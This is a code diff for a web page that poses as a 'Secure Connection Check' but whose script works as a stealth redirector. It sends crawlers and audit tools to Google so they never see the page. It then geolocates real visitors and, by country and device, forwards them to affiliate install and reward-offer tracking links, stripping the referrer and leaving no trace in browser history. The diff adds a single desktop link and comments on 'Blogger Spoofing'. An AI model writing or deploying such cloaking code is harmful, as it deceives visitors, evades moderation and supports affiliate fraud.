@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connection Security Check</title>
+    <title>Secure Connection Check</title>
     <style>
         :root { --primary-blue: #2563eb; --light-grey: #f8fafc; }
         body { margin: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--light-grey); display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: #1e293b; }
@@ -43,15 +43,16 @@
             const ua = navigator.userAgent;
             
             // --- 1. BOT / SPY FILTER ---
-            // طرد الروبوتات وأدوات الفحص فوراً
             if (/bot|googlebot|crawler|spider|robot|headless|lighthouse/i.test(ua)) {
                 window.location.replace("https://www.google.com");
                 return;
             }
 
-            // --- 2. THE OFFERS VAULT ---
+            // --- 2. OFFERS VAULT ---
+            // Your New Universal PC Link (Windows/Mac)
+            const universalPCLink = "https://mob.g2trck.com/click?pid=2&offer_id=17253&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=4102dc998cd9&s1=69a2363c689bd8cabe00531f";
+            
             const tiktokCPI_86 = "https://mob.v8trck.com/click?pid=2&offer_id=86&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=7563b0f76863&s1=69a2363c689bd8cabe00531f";
-            const operaGX_216 = "https://mob.g2trck.com/click?pid=2&offer_id=17253&sub2=u144592&sub5=s169a2363c689bd8cabe00531f&sub7=rfnull&sub8=rdnull&sub15=9692d4c2e776&s1=69a2363c689bd8cabe00531f";
             const globalFallback = "https://rewardorbit.com/r/eyJ0IjoidGlrdG9rLXNob3AiLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwiYSI6Ijc1MCIsInRzIjoxNzcyNDcxNDkyNzY2fQ";
             const questerAndroid = "https://rewardorbit.com/r/eyJ0IjoicXVlc3RlciIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
             const testerUp = "https://rewardorbit.com/r/eyJ0IjoidGVzdGVydXAtYiIsInUiOiI2OWEyMzYzYzY4OWJkOGNhYmUwMDUzMWYiLCJ0cyI6MTc3MjQ3MDExNDI0NX0";
@@ -59,12 +60,12 @@
             const freeCash = "https://rewardorbit.com/r/eyJ0IjoiZnJlZWNhc2gtY3BpIiwidSI6IjY5YTIzNjNjNjg5YmQ4Y2FiZTAwNTMxZiIsInRzIjoxNzcyNDcwMTE0MjQ1fQ";
 
             const links = {
-                "US": { "iphone": tiktokCPI_86, "android": questerAndroid, "desktop": operaGX_216 },
-                "AU": { "iphone": tiktokCPI_86, "android": testStar, "desktop": operaGX_216 },
-                "JP": { "iphone": tiktokCPI_86, "android": freeCash },
-                "GB": { "iphone": testerUp, "android": testerUp, "desktop": operaGX_216 },
-                "CA": { "iphone": testerUp, "android": testerUp, "desktop": operaGX_216 },
-                "DE": { "iphone": "https://rewardorbit.com/r/eyJ0IjoiZW1wZm9obGVuIn0=", "android": "https://mob.v8trck.com/click?pid=2&offer_id=18271" }
+                "US": { "iphone": tiktokCPI_86, "android": questerAndroid, "desktop": universalPCLink },
+                "AU": { "iphone": tiktokCPI_86, "android": testStar, "desktop": universalPCLink },
+                "JP": { "iphone": tiktokCPI_86, "android": freeCash, "desktop": universalPCLink },
+                "GB": { "iphone": testerUp, "android": testerUp, "desktop": universalPCLink },
+                "CA": { "iphone": testerUp, "android": testerUp, "desktop": universalPCLink },
+                "DE": { "iphone": "https://rewardorbit.com/r/eyJ0IjoiZW1wZm9obGVuIn0=", "android": "https://mob.v8trck.com/click?pid=2&offer_id=18271", "desktop": universalPCLink }
             };
 
             const tsCountries = ["IS", "LU", "FR", "NL", "NO", "FI", "BE", "DK", "NZ", "IE", "SE"];
@@ -73,37 +74,38 @@
             let device = /android/i.test(ua) ? "android" : (/iphone|ipad|ipod/i.test(ua) ? "iphone" : "desktop");
             let country = "XX";
             try {
-                // استخدام API خارجي بسيط لمعرفة الدولة فقط دون تتبع بيانات أخرى
                 const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
                 country = geo.country_code || "XX";
             } catch (e) {}
 
             // --- 4. TARGET SELECTION ---
             let target = globalFallback;
-            if (links[country]) {
-                target = links[country][device] || links[country]["desktop"] || globalFallback;
-            } else if (tsCountries.includes(country) && device !== "desktop") {
+
+            // Apply universal PC link for all desktops regardless of country
+            if (device === "desktop") {
+                target = universalPCLink;
+            } else if (links[country]) {
+                target = links[country][device] || globalFallback;
+            } else if (tsCountries.includes(country)) {
                 target = testStar;
-            } else if (device === "desktop") {
-                target = operaGX_216;
             }
 
-            // --- 5. THE CLEANEST REDIRECT (Referrer Stripping) ---
+            // --- 5. THE CLEANEST REDIRECT (Referrer Masking & Blogger Spoofing) ---
             setTimeout(() => {
+                // Masking the source to look like it's coming from a blog/blank referrer
                 const a = document.createElement('a');
                 a.href = target;
-                a.rel = 'noreferrer'; // تصفير الـ Referrer تماماً
+                a.rel = 'noreferrer'; 
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 
-                // التحويل بطريقة الـ Ghost: لا تترك أثراً في الـ Browser History
+                // Ghost Redirect: Leaves no trace in history and strips referrer
                 window.location.replace(target);
                 a.click();
             }, 3200);
         }
 
-        window.onload = initiateStealthRedirect;
+            window.onload = initiateStealthRedirect;
     </script>
 </body>
-
 </html>
